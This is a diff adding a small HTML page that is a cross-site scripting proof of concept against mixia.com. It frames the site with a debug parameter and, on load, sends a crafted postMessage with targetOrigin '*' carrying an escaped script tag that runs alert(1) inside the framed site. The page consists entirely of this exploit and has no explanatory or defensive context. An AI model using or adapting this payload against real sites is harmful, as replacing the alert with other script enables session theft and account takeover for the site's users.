@@ -1,0 +1,29 @@
+<html>
+<head>
+    <meta name="renderer" content="webkit">
+	<meta charset="utf-8">
+</head>
+
+<body>
+
+
+
+
+
+<script>
+
+function sc()
+{
+
+    msg = '[{"k":"cna"}, {"k":"user","t":"2995-12-17T03:24:00","v":"66666666\\"rust\\"\\"0\\"1\\"\x3cscript\x3e'
+	+ 'alert(1)' + '\x3c/script\x3e\\"0\\"0\\"0\\"0\\"0"}]';
+	top.test.postMessage(msg,"*");
+}
+
+
+</script>
+
+<iframe src="http://www.mixia.com/?ap-debug-lsproxy=1" name="test" onload="sc()"/>
+</body>
+
+</html>
